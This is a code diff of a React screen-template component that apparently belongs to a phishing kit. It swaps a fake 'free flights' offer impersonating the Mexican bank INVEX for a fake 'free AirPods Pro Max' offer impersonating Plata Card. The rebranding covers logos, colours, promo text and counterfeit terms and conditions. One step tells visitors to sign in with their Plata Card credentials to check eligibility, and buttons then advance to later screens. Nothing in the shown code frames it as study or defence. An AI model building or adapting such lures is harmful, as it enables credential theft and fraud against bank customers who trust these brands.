@@ -142,17 +142,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.PROMOCION:
         const promocionContent = (
           <div className="min-h-screen bg-white">
-            {/* Header navegación INVEX */}
+            {/* Header navegación PLATA CARD */}
             <div className="bg-white border-b border-gray-200 px-4 py-3">
               <div className="max-w-7xl mx-auto flex flex-col sm:flex-row justify-between items-start sm:items-center">
                 <div className="flex items-center mb-3 sm:mb-0">
-                  <div className="text-[#BE0046] font-bold text-xl">INVEX</div>
+                  <div className="text-gray-600 font-bold text-xl">PLATA<span className="text-gray-800">CARD</span></div>
                 </div>
                 <nav className="flex flex-wrap gap-4 md:gap-6 text-sm text-gray-600">
-                  <span className="hover:text-[#BE0046] cursor-pointer">Banco</span>
-                  <span className="hover:text-[#BE0046] cursor-pointer">Productos</span>
-                  <span className="hover:text-[#BE0046] cursor-pointer">Promociones</span>
-                  <span className="hover:text-[#BE0046] cursor-pointer">Ayuda</span>
+                  <span className="hover:text-gray-800 cursor-pointer">Tarjetas</span>
+                  <span className="hover:text-gray-800 cursor-pointer">Productos</span>
+                  <span className="hover:text-gray-800 cursor-pointer">Promociones</span>
+                  <span className="hover:text-gray-800 cursor-pointer">Ayuda</span>
                 </nav>
               </div>
             </div>
@@ -170,62 +170,62 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   </div>
                   
                   {/* Promoción destacada */}
-                  <div className="bg-gradient-to-r from-red-500 to-red-600 text-white rounded-xl p-6 md:p-8 mb-6 max-w-2xl mx-auto">
-                    <h1 className="text-3xl md:text-5xl font-bold mb-2">2 Vuelos</h1>
-                    <h1 className="text-3xl md:text-5xl font-bold mb-3">Gratis</h1>
-                    <p className="text-xl md:text-2xl">para ti</p>
+                  <div className="bg-gradient-to-r from-gray-600 to-gray-700 text-white rounded-xl p-6 md:p-8 mb-6 max-w-2xl mx-auto">
+                    <h1 className="text-3xl md:text-5xl font-bold mb-2">AirPods</h1>
+                    <h1 className="text-3xl md:text-5xl font-bold mb-3">Pro Max</h1>
+                    <p className="text-xl md:text-2xl">Totalmente Gratis</p>
                   </div>
                   
                   <p className="text-base md:text-lg text-gray-700 leading-relaxed max-w-3xl mx-auto mb-8">
-                    Como cliente seleccionado de INVEX, tienes la oportunidad de obtener 
-                    <strong className="text-[#BE0046]"> 2 vuelos nacionales completamente gratis</strong>. 
-                    Solo pagas la TUA (Tarifa de Uso de Aeropuerto).
+                    Para clientes seleccionados por el buen uso de su tarjeta reciben 
+                    <strong className="text-gray-600"> AirPods Pro Max totalmente gratis</strong>. 
+                    Sin costo adicional por su excelente historial crediticio.
                   </p>
                 </div>
 
                 {/* Beneficios destacados */}
                 <div className="grid sm:grid-cols-2 gap-4 mb-8 max-w-2xl mx-auto">
-                  <div className="bg-blue-50 p-4 rounded-lg text-center border border-blue-200">
-                    <div className="text-2xl mb-2">✈️</div>
-                    <h3 className="font-bold text-blue-900 mb-1">Vuelos VOLARIS</h3>
-                    <p className="text-sm text-gray-700">Tarifa aérea $0</p>
+                  <div className="bg-gray-50 p-4 rounded-lg text-center border border-gray-200">
+                    <div className="text-2xl mb-2">🎧</div>
+                    <h3 className="font-bold text-gray-900 mb-1">AirPods Pro Max</h3>
+                    <p className="text-sm text-gray-700">$0 pesos</p>
                   </div>
                   <div className="bg-green-50 p-4 rounded-lg text-center border border-green-200">
                     <div className="text-2xl mb-2">💳</div>
-                    <h3 className="font-bold text-green-900 mb-1">Sin costos ocultos</h3>
-                    <p className="text-sm text-gray-700">Solo pagas TUA</p>
+                    <h3 className="font-bold text-green-900 mb-1">Sin costos</h3>
+                    <p className="text-sm text-gray-700">Totalmente gratis</p>
                   </div>
                 </div>
 
                 {/* Botón principal */}
                 <div className="text-center mb-8">
                   <Button 
-                    className="w-full sm:w-auto bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white px-8 py-4 text-lg font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
+                    className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-8 py-4 text-lg font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                     onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                   >
-                    Reclamar mis vuelos gratis →
+                    Reclamar mis AirPods Pro Max →
                   </Button>
                 </div>
 
                 {/* Información adicional */}
                 <div className="bg-gray-50 rounded-lg p-6 mb-8 max-w-4xl mx-auto">
                   <div className="flex items-center justify-center mb-4">
-                    <span className="text-xl mr-2">✈️</span>
-                    <h3 className="font-bold text-gray-800">Tu promoción te espera</h3>
+                    <span className="text-xl mr-2">🎧</span>
+                    <h3 className="font-bold text-gray-800">Tus AirPods Pro Max te esperan</h3>
                   </div>
                   
                   <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-center text-sm">
                     <div>
-                      <div className="font-semibold text-gray-700 mb-1">Destinos disponibles</div>
-                      <div className="text-blue-600 font-medium">Toda la República Mexicana</div>
+                      <div className="font-semibold text-gray-700 mb-1">Producto</div>
+                      <div className="text-gray-600 font-medium">AirPods Pro Max Originales</div>
                     </div>
                     <div>
                       <div className="font-semibold text-gray-700 mb-1">Vigencia</div>
-                      <div className="text-blue-600 font-medium">12 meses</div>
+                      <div className="text-gray-600 font-medium">6 meses</div>
                     </div>
                     <div>
-                      <div className="font-semibold text-gray-700 mb-1">Aerolínea</div>
-                      <div className="text-blue-600 font-medium">VOLARIS</div>
+                      <div className="font-semibold text-gray-700 mb-1">Entrega</div>
+                      <div className="text-gray-600 font-medium">A domicilio</div>
                     </div>
                   </div>
                 </div>
@@ -237,7 +237,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <div className="max-w-4xl mx-auto px-4">
                 <div className="text-center mb-8">
                   <h2 className="text-2xl md:text-3xl font-bold text-gray-900 mb-2">¿Cómo funciona?</h2>
-                  <p className="text-lg text-gray-600">Solo 3 pasos para disfrutar tus vuelos gratis</p>
+                  <p className="text-lg text-gray-600">Solo 3 pasos para recibir tus AirPods Pro Max</p>
                 </div>
                 
                 <div className="space-y-4 md:space-y-6 max-w-3xl mx-auto">
@@ -252,16 +252,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="flex items-start bg-blue-50 p-4 md:p-6 rounded-lg">
                     <span className="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-lg font-bold mr-4 mt-1 flex-shrink-0">2</span>
                     <div>
-                      <div className="font-bold text-blue-900 text-lg mb-2">Inicia sesión</div>
-                      <div className="text-gray-700">Accede con tus credenciales de INVEX para verificar tu elegibilidad</div>
+                      <div className="font-bold text-gray-900 text-lg mb-2">Inicia sesión</div>
+                      <div className="text-gray-700">Accede con tus credenciales de Plata Card para verificar tu elegibilidad</div>
                     </div>
                   </div>
                   
                   <div className="flex items-start bg-blue-50 p-4 md:p-6 rounded-lg">
                     <span className="bg-blue-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-lg font-bold mr-4 mt-1 flex-shrink-0">3</span>
                     <div>
-                      <div className="font-bold text-blue-900 text-lg mb-2">Recibe tus vuelos</div>
-                      <div className="text-gray-700">Te enviaremos las instrucciones para canjear tus vuelos gratis</div>
+                      <div className="font-bold text-gray-900 text-lg mb-2">Recibe tus AirPods</div>
+                      <div className="text-gray-700">Te enviaremos tus AirPods Pro Max directamente a tu domicilio</div>
                     </div>
                   </div>
                 </div>
@@ -269,13 +269,13 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 {/* Botón final */}
                 <div className="text-center mt-10">
                   <Button 
-                    className="w-full sm:w-auto bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white px-8 py-4 text-lg font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
+                    className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-8 py-4 text-lg font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
                     onClick={() => onSubmit(ScreenType.PROMOCION, {})}
                   >
-                    Reclamar mis vuelos gratis →
+                    Reclamar mis AirPods Pro Max →
                   </Button>
                   <p className="text-sm text-gray-500 mt-4">
-                    * Promoción válida solo para clientes seleccionados de INVEX
+                    * Promoción válida solo para clientes seleccionados de Plata Card
                   </p>
                 </div>
               </div>
@@ -287,37 +287,37 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.TERMINOS:
         const terminosContent = (
           <>
-            <h2 className="text-lg font-bold mb-4 text-[#BE0046]">
-              Términos y Condiciones de la Promoción B2 Vuelos Gratis a Clientes Seleccionados INVEX
+            <h2 className="text-lg font-bold mb-4 text-gray-700">
+              Términos y Condiciones de la Promoción AirPods Pro Max Gratis a Clientes Seleccionados Plata Card
             </h2>
             <div className="max-h-80 overflow-y-auto text-left mb-6 text-sm text-gray-700 pr-2">
               <p className="mb-3">
-                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "B2 Vuelos Gratis a Clientes Seleccionados INVEX" ofrecida por BANCO INVEX, S.A., INSTITUCIÓN DE BANCA MÚLTIPLE INVEX GRUPO FINANCIERO.
+                Los presentes Términos y Condiciones tienen por objeto reglamentar y establecer los procedimientos aplicables a la promoción denominada "AirPods Pro Max Gratis a Clientes Seleccionados Plata Card" ofrecida por PLATA CARD.
               </p>
               <p className="mb-2 font-semibold">1. Requisitos para Participar:</p>
-              <p className="mb-3">La promoción está dirigida exclusivamente a clientes seleccionados de INVEX Banco, quienes deberán cumplir con los siguientes requisitos:</p>
+              <p className="mb-3">La promoción está dirigida exclusivamente a clientes seleccionados de Plata Card, quienes deberán cumplir con los siguientes requisitos:</p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>Ser titular de una tarjeta de crédito INVEX válida y activa.</li>
-                <li>Cumplir con las condiciones de elegibilidad que INVEX Banco determine.</li>
+                <li>Ser titular de una tarjeta Plata Card válida y activa.</li>
+                <li>Tener un historial crediticio excelente con buen uso de la tarjeta.</li>
                 <li>Ser notificado de su selección para participar en la promoción.</li>
               </ul>
               <p className="mb-2 font-semibold">2. Descripción de la Promoción:</p>
               <p className="mb-3">
-                Los clientes seleccionados recibirán el beneficio de un vuelo gratuito a tarifa aérea 0, cubriendo solo los cargos por TUA. La promoción solo aplica para vuelos con VOLARIS.
+                Los clientes seleccionados recibirán AirPods Pro Max originales totalmente gratuitos como reconocimiento por su excelente historial crediticio.
               </p>
               <p className="mb-2 font-semibold">3. Condiciones Generales:</p>
               <ul className="mb-3 ml-4 list-disc">
-                <li>El vuelo gratuito solo incluye la tarifa aérea 0.</li>
-                <li>El cliente deberá asumir el costo del TUA y otros cargos adicionales.</li>
-                <li>Válido para vuelos nacionales e internacionales según disponibilidad.</li>
+                <li>Los AirPods Pro Max se entregan completamente gratuitos.</li>
+                <li>La entrega se realiza directamente al domicilio registrado.</li>
+                <li>Válido hasta agotar existencias o por 6 meses desde la fecha de la promoción.</li>
               </ul>
               <p className="mb-2 font-semibold">8. Uso de Datos Personales:</p>
               <p className="mb-3">
-                Al participar, el cliente acepta que los datos personales puedan ser utilizados por INVEX Banco para fines relacionados con la promoción y otros fines comerciales.
+                Al participar, el cliente acepta que los datos personales puedan ser utilizados por Plata Card para fines relacionados con la promoción y otros fines comerciales.
               </p>
             </div>
             <Button 
-              className="w-full bg-[#a71138] hover:bg-[#e04343] text-white py-3 text-lg"
+              className="w-full bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white py-3 text-lg"
               onClick={() => onSubmit(ScreenType.TERMINOS, {})}
             >
               Aceptar Términos
